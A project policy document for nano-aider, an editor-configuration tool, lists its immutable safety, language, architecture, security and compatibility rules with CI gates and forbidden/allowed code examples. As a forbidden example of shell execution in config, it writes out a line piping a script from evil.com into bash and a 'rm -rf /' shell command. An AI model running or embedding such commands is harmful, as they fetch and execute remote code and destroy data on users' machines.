# LOCK_SCOPE.md - Immutable Constraints

<!-- SPDX-License-Identifier: MIT OR AGPL-3.0-or-later -->
<!-- SPDX-FileCopyrightText: 2025 hyperpolymath -->

> **Lock Scope**: Defines what nano-aider will **NEVER** do. These constraints
> are immutable and supersede all other project decisions.

## Core Guarantees

### 1. User Safety

nano-aider will **NEVER**:

| Constraint | Rationale |
|------------|-----------|
| Execute arbitrary shell commands from config files | Config is data, not code |
| Modify editor binaries or system files | Read-only discovery tool |
| Transmit configuration data over network | Offline-first, no telemetry |
| Store credentials or secrets | No authentication required |
| Require root/admin privileges | User-space operation only |
| Access files outside `~/.config`, `~/.nano*`, `~/.local` | Scoped filesystem access |

### 2. Language Lock

nano-aider will **NEVER** contain:

| Banned | Reason | Enforced By |
|--------|--------|-------------|
| TypeScript | Use ReScript | `rsr-antipattern.yml` |
| Node.js/npm/bun | Use Deno | `npm-bun-blocker.yml` |
| Go | Use Rust | `rsr-antipattern.yml` |
| Python (non-SaltStack) | Use Ada/Rust | CI checks |
| Kotlin/Swift | Use Tauri/Dioxus | Policy |

**Allowed**: Ada, Bash/POSIX, Rust (future extensions)

### 3. Architectural Invariants

nano-aider will **NEVER**:

| Constraint | Rationale |
|------------|-----------|
| Require heap allocation for core operations | Stack-safe, deterministic |
| Depend on external services or APIs | Fully offline capable |
| Break SPARK verification contracts | Safety-critical paths remain proven |
| Remove ncurses-only TUI mode | Terminal-first interface |
| Add mandatory GUI dependencies | TUI remains standalone |

### 4. Security Boundaries

nano-aider will **NEVER**:

| Constraint | Enforcement |
|------------|-------------|
| Use MD5/SHA1 for integrity | SHA256+ required |
| Accept HTTP URLs | HTTPS only |
| Embed hardcoded secrets | CI secret scanner |
| Load unsigned plugins | Future plugin system |
| Disable ASLR/stack protection | Compiler flags locked |

### 5. Compatibility Lock

nano-aider will **NEVER**:

| Constraint | Scope |
|------------|-------|
| Drop support for nano 5.x+ | Minimum supported version |
| Remove micro editor support | Secondary editor |
| Break existing `.nanorc` compatibility | Import always works |
| Change XDG directory conventions | `~/.config/nano-aider/` |
| Alter profile file format without migration | Versioned profiles |

## Enforcement

These constraints are enforced by:

1. **CI Workflows** - Automated rejection of violating commits
2. **SPARK Proofs** - Formal verification of safety properties
3. **CarecTL Profiles** - Audit-grade compliance checks
4. **Code Review** - Human verification of architectural changes

### CI Safety Gates

The `lock-scope-gates.yml` workflow runs on every push/PR:

| Gate | Checks | Blocks |
|------|--------|--------|
| `user-safety-gates` | Shell exec, network, root, filesystem scope | ❌ Violations |
| `language-lock-gates` | Ada source, no Kotlin/Swift, SPDX headers | ❌ Violations |
| `architectural-gates` | Heap allocation, external APIs, SPARK, ncurses | ⚠️/❌ |
| `security-boundary-gates` | Weak crypto, HTTP URLs, hardcoded secrets | ❌ Violations |
| `compatibility-gates` | nano 5.x+, XDG, nanorc import | ⚠️ Warnings |

## Example Policies

### Policy: No Telemetry (User Safety §1)

```ada
-- ❌ FORBIDDEN: Network telemetry
procedure Send_Usage_Stats is
   Client : HTTP.Client;
begin
   Client.Post ("https://analytics.example.com/usage", Data);
end Send_Usage_Stats;

-- ✅ ALLOWED: Local-only logging
procedure Log_Usage is
begin
   Ada.Text_IO.Put_Line (Log_File, "Option accessed: " & Name);
end Log_Usage;
```

### Policy: Config as Data (User Safety §1)

```yaml
# ❌ FORBIDDEN: Shell execution in config
on_load: "$(curl https://evil.com/payload.sh | bash)"
command: !shell "rm -rf /"

# ✅ ALLOWED: Pure data configuration
theme: "monokai"
line_numbers: true
tab_size: 4
```

### Policy: Stack-Safe Operations (Architectural §3)

```ada
-- ⚠️ DISCOURAGED: Unbounded heap allocation
Names : Ada.Strings.Unbounded.Unbounded_String;
Buffer : access String := new String (1 .. Size);

-- ✅ PREFERRED: Bounded stack allocation
Names : String (1 .. Max_Name_Length);
Buffer : String (1 .. Fixed_Buffer_Size);
```

### Policy: Cryptographic Strength (Security §4)

```ada
-- ❌ FORBIDDEN: Weak hash algorithms
Hash : MD5.Context;        -- MD5 broken
Hash : SHA1.Context;       -- SHA1 deprecated

-- ✅ REQUIRED: Strong hash algorithms
Hash : SHA256.Context;     -- Minimum acceptable
Hash : SHA3_256.Context;   -- Preferred
Hash : BLAKE3.Context;     -- Also acceptable
```

### Policy: HTTPS Only (Security §4)

```ada
-- ❌ FORBIDDEN: Insecure transport
URL : constant String := "http://example.com/config";

-- ✅ REQUIRED: Secure transport
URL : constant String := "https://example.com/config";

-- ✅ ALLOWED: Local addresses (development)
URL : constant String := "http://localhost:8080/debug";
URL : constant String := "http://127.0.0.1:3000/test";
```

### Policy: Filesystem Scope (User Safety §1)

```ada
-- ❌ FORBIDDEN: System-wide access
Config_Path : constant String := "/etc/nanorc";
Binary_Path : constant String := "/usr/bin/nano";

-- ✅ ALLOWED: User-scoped access
Config_Path : constant String := Home & "/.nanorc";
Config_Path : constant String := XDG_Config & "/nano/nanorc";
Data_Path   : constant String := Home & "/.local/share/nano-aider/";
```

## Exceptions

There are **no exceptions** to this lock scope. Any change requiring an
exception must:

1. Update this document with explicit rationale
2. Obtain maintainer approval via RFC process
3. Increment major version (breaking change)
4. Notify all downstream consumers

---

*Lock Scope Version: 1.0.0*
*Last Updated: 2025-12-27*
